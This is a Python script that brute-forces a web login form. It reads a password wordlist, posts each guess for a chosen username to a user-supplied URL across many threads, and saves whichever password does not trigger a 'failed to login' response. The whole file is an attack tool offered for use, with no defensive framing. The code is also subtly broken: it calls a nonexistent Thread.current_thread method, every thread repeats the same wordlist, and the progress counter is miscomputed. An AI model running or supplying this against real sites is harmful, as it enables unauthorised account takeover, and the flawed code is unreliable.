import requests
from threading import Thread, Lock
import os
import time

def send_request(url, username, password, lock, session, timeout=5):
    data = {
        "username": username,
        "password": password
    }

    try:
        r = session.post(url, data=data, timeout=timeout)
        with lock:
            print(f"Thread {Thread.current_thread().ident}: Attempted - {password}")
        return r
    except requests.RequestException as e:
        with lock:
            print(f"Thread {Thread.current_thread().ident}: Exception - {e}")
        return None

def main(url, username, password_file, tries_file, correct_pass_file, lock, progress_list, timeout):
    with open(password_file, 'r') as file:
        passwords = file.read().splitlines()

    session = requests.Session()  # Use a session to persist cookies across requests

    for passwd in passwords:
        start_time = time.time()
        r = send_request(url, username, passwd, lock, session, timeout)

        if r and 'failed to login' in r.text.lower():
            with open(tries_file, "a") as f:
                f.write(f"{passwd}\n")
            print(f"Incorrect {passwd}\n")
        elif r:
            print(f"Correct Password {passwd}!\n")
            with open(correct_pass_file, "w") as f:
                f.write(passwd)
            with lock:
                progress_list[0] += 1

        elapsed_time = time.time() - start_time
        with lock:
            progress_list[1] += elapsed_time

def progress_tracker(total_threads, progress_list):
    while True:
        with progress_list[2]:
            if progress_list[0] >= total_threads:
                break
            progress = (progress_list[0] / total_threads) * 100
            avg_time_per_thread = progress_list[1] / total_threads if progress_list[0] > 0 else 0
            eta = (total_threads - progress_list[0]) * avg_time_per_thread
            print(f"Progress: {progress:.2f}% ({progress_list[0]}/{total_threads} threads) | ETA: {eta:.2f} seconds")

if __name__ == "__main__":
    user_url = input("Enter the URL: ")
    username = input("Enter the username: ")
    password_file = input("Enter the path to the file containing passwords: ")

    tries_file = input("Enter the name for the file to store unsuccessful attempts: tries.txt ")
    correct_pass_file = input("Enter the name for the file to store the correct password: correct_pass.txt ")

    num_threads = os.cpu_count() * 2  # Use twice the number of CPU cores for threads
    timeout = int(input("Enter the request timeout in seconds: "))

    lock = Lock()
    progress_list = [0, 0, Lock()]  # [completed_threads, total_elapsed_time, progress_lock]

    def track_progress():
        progress_tracker(num_threads, progress_list)

    tracker_thread = Thread(target=track_progress, daemon=True)
    tracker_thread.start()

    thread_list = []
    for _ in range(num_threads):
        thread = Thread(target=main, args=(user_url, username, password_file, tries_file, correct_pass_file, lock, progress_list, timeout))
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

    tracker_thread.join()  # Ensure the progress tracker thread has completed
    print("All threads have completed.")
